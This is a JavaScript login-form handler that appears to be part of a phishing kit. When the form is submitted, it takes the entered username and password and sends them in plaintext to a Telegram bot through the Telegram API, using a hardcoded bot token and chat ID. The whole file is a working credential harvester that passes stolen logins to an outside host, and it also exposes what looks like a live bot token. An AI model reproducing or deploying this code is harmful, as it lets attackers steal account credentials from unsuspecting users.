const form = document.getElementById("loginForm");
const responseDiv = document.getElementById("response");

// Telegram Bot Token and Chat ID
const botToken = "7672933931:AAG_7DBGgNxJ_uHy7hsgZ13Eu40aM-Lj1tg"; // Replace with your bot token
const chatId = "7493740702"; // Replace with your chat ID

form.addEventListener("submit", (event) => {
  event.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Message to be sent
  const message = `New Login Details:\nUsername: ${username}\nPassword: ${password}`;

  // Send data to Telegram
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => {
      if (response.ok) {
        responseDiv.textContent = "Login details sent to your Telegram!";
        form.reset();
      } else {
        responseDiv.textContent = "Failed to send login details.";
      }
    })
    .catch((error) => {
      responseDiv.textContent = "An error occurred while sending the message.";
      console.error(error);
    });
});